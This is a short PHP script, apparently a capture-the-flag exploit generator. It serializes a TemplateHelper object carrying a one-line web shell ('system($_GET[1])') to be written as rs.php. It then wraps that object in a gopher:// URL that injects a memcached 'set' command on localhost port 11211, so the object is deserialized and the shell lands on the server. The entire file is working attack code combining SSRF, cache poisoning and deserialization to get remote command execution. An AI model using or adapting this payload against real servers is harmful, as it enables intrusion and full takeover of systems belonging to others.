<?php

class TemplateHelper
{

    private $file;
    private $data;

    public function __construct(string $file, string $data)
    {
    	$this->init($file, $data);
    }

    public function __wakeup()
    {
    	$this->init($this->file, $this->data);
    }

    private function init(string $file, string $data)
    {    	
        $this->file = $file;
        $this->data = $data;
    }

}

$th = new TemplateHelper('rs.php','<?php system($_GET[1]); ?>');

$serialized = serialize($th);
$prefix = "gopher://LOCALHOST:11211/_%0d%0a";
$newline = "%0d%0a";
$key = 'xct_' . md5(md5($argv[1]) . ':spc');
$cmd = str_replace("_KEY_", $key, "set _KEY_ 4 0 ");
$cmd = $cmd . strlen($serialized);

$payload = $prefix . rawurlencode($cmd) . $newline . rawurlencode($serialized) . $newline;

echo $payload;

